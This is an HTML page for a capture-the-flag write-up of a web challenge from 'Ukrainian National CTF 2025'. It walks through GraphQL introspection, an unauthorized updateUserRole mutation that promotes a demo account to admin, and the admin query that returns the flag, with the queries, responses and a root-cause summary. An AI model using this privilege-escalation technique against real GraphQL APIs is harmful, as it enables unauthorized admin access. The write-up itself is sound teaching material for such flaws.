@@ -1,0 +1,420 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Ukrainian National CTF 2025 – Task 8 (GraphQL Introspection + IDOR)</title>
+    <meta name="description" content="Writeup for Task 8 (GraphQL Introspection + IDOR) from Ukrainian National CTF 2025 by Alexandru Hossu.">
+    <meta property="og:title" content="Task 8 – GraphQL Introspection + IDOR" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root {
+        --bg: #121212;
+        --fg: #e0e0e0;
+        --accent: #61dafb;
+        --border: #333;
+        --muted: #a0a0a0;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'Work Sans', sans-serif;
+        line-height: 1.6;
+      }
+
+      a {
+        color: var(--accent);
+        text-decoration: none;
+      }
+      a:hover { text-decoration: underline; }
+
+      .wrapper {
+        max-width: 768px;
+        margin: 0 auto;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .site-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 3rem;
+      }
+      .site-title {
+        font-weight: 700;
+        font-size: 1.5rem;
+        color: var(--fg);
+      }
+      .site-logo {
+        height: 48px;
+        width: 48px;
+        border-radius: 50%;
+        object-fit: cover;
+      }
+
+      .post {
+        max-width: 768px;
+        margin: 0 auto;
+      }
+
+      .post-header h1 {
+        margin: 0 0 0.5rem;
+        font-size: 2rem;
+        font-weight: 500;
+      }
+
+      .post-subtitle {
+        margin: 0 0 0.75rem;
+        opacity: 0.8;
+        font-size: 1rem;
+      }
+
+      .post-meta {
+        margin: 0 0 1.5rem;
+        font-size: 0.9rem;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+
+      .post-tags {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.4rem;
+        margin-top: 0.4rem;
+      }
+      .tag {
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.02);
+      }
+
+      .post-toc {
+        margin: 2rem 0;
+        padding: 1rem 1.25rem;
+        border-radius: 0.75rem;
+        border: 1px solid var(--border);
+        background: #181818;
+      }
+      .post-toc-title {
+        margin: 0 0 0.5rem;
+        font-size: 0.95rem;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        opacity: 0.8;
+      }
+      .post-toc ul {
+        margin: 0;
+        padding-left: 1.25rem;
+        font-size: 0.95rem;
+      }
+      .post-toc li {
+        margin: 0.1rem 0;
+      }
+
+      section + section {
+        margin-top: 2rem;
+      }
+      h2 {
+        font-size: 1.4rem;
+        margin-bottom: 0.5rem;
+        font-weight: 500;
+      }
+      h3 {
+        font-size: 1.15rem;
+        margin-bottom: 0.4rem;
+        font-weight: 500;
+      }
+
+      p {
+        margin: 0 0 0.9rem;
+      }
+
+      ul, ol {
+        padding-left: 1.25rem;
+        margin-top: 0;
+        margin-bottom: 0.9rem;
+      }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 0.9rem;
+        background: rgba(255,255,255,0.04);
+        padding: 0.15rem 0.3rem;
+        border-radius: 0.25rem;
+      }
+
+      pre {
+        margin: 0 0 1.25rem;
+        padding: 0.85rem 1rem;
+        background: #0b0b0b;
+        border-radius: 0.5rem;
+        border: 1px solid #1f1f1f;
+        overflow-x: auto;
+      }
+      pre code {
+        background: transparent;
+        padding: 0;
+      }
+
+      .note {
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: #181818;
+        font-size: 0.92rem;
+        margin-bottom: 1rem;
+      }
+
+      .back-link {
+        margin: 0 0 2rem;
+        font-size: 0.95rem;
+      }
+
+      .site-footer {
+        border-top: 1px solid var(--border);
+        margin-top: 3rem;
+        padding-top: 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .site-footer p {
+        margin: 0;
+        font-size: 0.9rem;
+        opacity: 0.6;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">
+          ← <a href="index.html">Back to all writeups</a>
+        </p>
+
+        <header class="post-header">
+          <h1>Ukrainian National CTF 2025 – Task 8 (GraphQL Introspection + IDOR)</h1>
+          <p class="post-subtitle">
+            GraphQL API with introspection enabled, an overpowered <code>updateUserRole</code> mutation,
+            and a clean privilege escalation to admin via IDOR.
+          </p>
+          <p class="post-meta">
+            <span>Category: Web</span>
+            <span>CTF: Ukrainian National CTF 2025</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">GraphQL</span>
+            <span class="tag">Introspection</span>
+            <span class="tag">IDOR</span>
+            <span class="tag">Privilege Escalation</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#context">0. Context</a></li>
+            <li><a href="#login">1. Logging in</a></li>
+            <li><a href="#introspection">2. GraphQL introspection</a></li>
+            <li><a href="#idor">3. Escalating to admin via IDOR</a></li>
+            <li><a href="#admin-query">4. Calling the admin query</a></li>
+            <li><a href="#root-cause">5. Root cause</a></li>
+            <li><a href="#flag">6. Flag</a></li>
+          </ul>
+        </nav>
+
+        <section id="context">
+          <h2>0. Context</h2>
+          <p>
+            The challenge exposes a small Flask app with a GraphQL endpoint and a login page.
+            After logging in, you get access to a GraphQL playground.
+          </p>
+          <p>
+            The idea is straightforward:
+          </p>
+          <ol>
+            <li>Log in as a normal user.</li>
+            <li>Use GraphQL introspection to list all mutations.</li>
+            <li>Abuse a badly protected mutation (<code>updateUserRole</code>).</li>
+            <li>Promote yourself to admin and call an admin-only query to get the flag.</li>
+          </ol>
+        </section>
+
+        <section id="login">
+          <h2>1. Logging in</h2>
+          <p>
+            The challenge gives demo credentials. I used the developer account:
+          </p>
+          <pre><code>developer / dev2024!</code></pre>
+          <p>
+            After login, the app redirects to a GraphQL playground where you can run queries and mutations.
+          </p>
+        </section>
+
+        <section id="introspection">
+          <h2>2. GraphQL introspection</h2>
+          <p>
+            First thing I did was introspect the schema to see what mutations exist.
+          </p>
+
+          <pre><code class="language-graphql">query {
+  __schema {
+    mutationType {
+      fields {
+        name
+        args {
+          name
+          type { name }
+        }
+      }
+    }
+  }
+}</code></pre>
+
+          <p>
+            Among the usual stuff, one field immediately stood out:
+          </p>
+          <pre><code>updateUserRole(userId: ID, newRole: String)</code></pre>
+          <p>
+            There was no mention of any access control in the description, which already smelled like
+            a potential IDOR / missing authorization bug.
+          </p>
+        </section>
+
+        <section id="idor">
+          <h2>3. Escalating to admin via IDOR</h2>
+          <p>
+            Before using <code>updateUserRole</code>, I needed my own user ID. There was a handy
+            <code>me</code> query for that:
+          </p>
+
+          <pre><code class="language-graphql">query {
+  me {
+    id
+    username
+    role
+  }
+}</code></pre>
+
+          <p>
+            This returned something like:
+          </p>
+          <pre><code>{
+  "data": {
+    "me": {
+      "id": "2",
+      "username": "developer",
+      "role": "user"
+    }
+  }
+}</code></pre>
+
+          <p>
+            Then I tried to call <code>updateUserRole</code> on my own ID:
+          </p>
+
+          <pre><code class="language-graphql">mutation {
+  updateUserRole(userId: "2", newRole: "admin") {
+    id
+    username
+    role
+  }
+}</code></pre>
+
+          <p>
+            The response confirmed the change:
+          </p>
+          <pre><code>{
+  "data": {
+    "updateUserRole": {
+      "id": "2",
+      "username": "developer",
+      "role": "admin"
+    }
+  }
+}</code></pre>
+
+          <p>
+            No checks, no restrictions – the mutation happily changed my role to <code>admin</code>.
+          </p>
+        </section>
+
+        <section id="admin-query">
+          <h2>4. Calling the admin query</h2>
+          <p>
+            With the new role, I looked for anything “admin” related in the schema and found a query:
+          </p>
+          <pre><code>adminDashboard: String</code></pre>
+
+          <p>
+            Running it after the role upgrade:
+          </p>
+
+          <pre><code class="language-graphql">query {
+  adminDashboard
+}</code></pre>
+
+          <p>
+            The server now accepted the call and returned the flag as part of the dashboard message.
+          </p>
+        </section>
+
+        <section id="root-cause">
+          <h2>5. Root cause</h2>
+          <p>
+            The whole chain comes down to two mistakes:
+          </p>
+          <ul>
+            <li>
+              GraphQL introspection was left enabled in production, exposing internal mutations
+              like <code>updateUserRole</code>.
+            </li>
+            <li>
+              <code>updateUserRole</code> had no proper authorization check – any authenticated user
+              could change any role, including their own.
+            </li>
+          </ul>
+          <p>
+            That turns a normal user account into an admin in a single mutation call.
+          </p>
+        </section>
+
+        <section id="flag">
+          <h2>6. Flag</h2>
+          <p>
+            The flag returned by <code>adminDashboard</code> was:
+          </p>
+          <pre><code>CTF{Khlib_ta_voda_kozatska_yida}</code></pre>
+        </section>
+      </article>
+
+      <footer class="site-footer">
+        <p>2025 © Alexandru Hossu</p>
+      </footer>
+    </div>
+  </body>
+</html>
